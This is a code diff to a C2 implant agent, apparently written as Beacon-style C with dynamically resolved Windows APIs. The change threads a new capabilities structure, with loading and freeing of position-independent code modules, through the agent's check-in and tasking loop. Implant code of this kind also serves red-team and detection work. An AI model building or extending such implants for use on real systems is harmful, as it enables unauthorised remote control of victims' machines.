@@ -28,9 +28,10 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 	return KERNEL32$GetProcAddress(hModule, func);
 }
 
-void agent_exit(AgentState *state) {
+void agent_exit(AgentState *state, AgentCapabilities *cap) {
 	HttpDestroy(state->http);
 	free_params(&state->params);
+	free_picos(cap);
 	KERNEL32$ExitProcess(0); // currently only ExitProcess() is supported TODO
 }
 
@@ -86,10 +87,10 @@ void perform_tasking(AgentParams *params, HttpHandle *http, TaskingReply *reply)
 	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
 }
 
-void process_task(TaskInfo *task, AgentState *state) {
+void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
 	if (MSVCRT$strcmp(task->command, "exit") == 0) {
 		dprintf("Received exit command.");
-		agent_exit(state);
+		agent_exit(state, cap);
 		return;
 	}
 	
@@ -98,8 +99,10 @@ void process_task(TaskInfo *task, AgentState *state) {
 
 void go() {
 	AgentState state = { 0 };
+	AgentCapabilities capabilities = { 0 };
 	
 	unpack_params(RAW_PARAMS, &state.params);
+	load_picos(&capabilities);
 	
 	state.http = HttpInit(state.params.callback_https);
 	
@@ -109,7 +112,7 @@ void go() {
 	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
 		dprintf("Checkin failed with: %s", checkin_reply.status);
 		free_checkin_reply(&checkin_reply);
-		agent_exit(&state);
+		agent_exit(&state, &capabilities);
 		return;
 	}
 	
@@ -124,7 +127,7 @@ void go() {
 		
 		dprintf("Received tasking from C2 server!");
 		for (int i = 0; i < tasking_reply.tasking_size; i++) {
-			process_task(&tasking_reply.tasks[i], &state);
+			process_task(&tasking_reply.tasks[i], &state, &capabilities);
 		}
 		
 		free_tasking_reply(&tasking_reply);
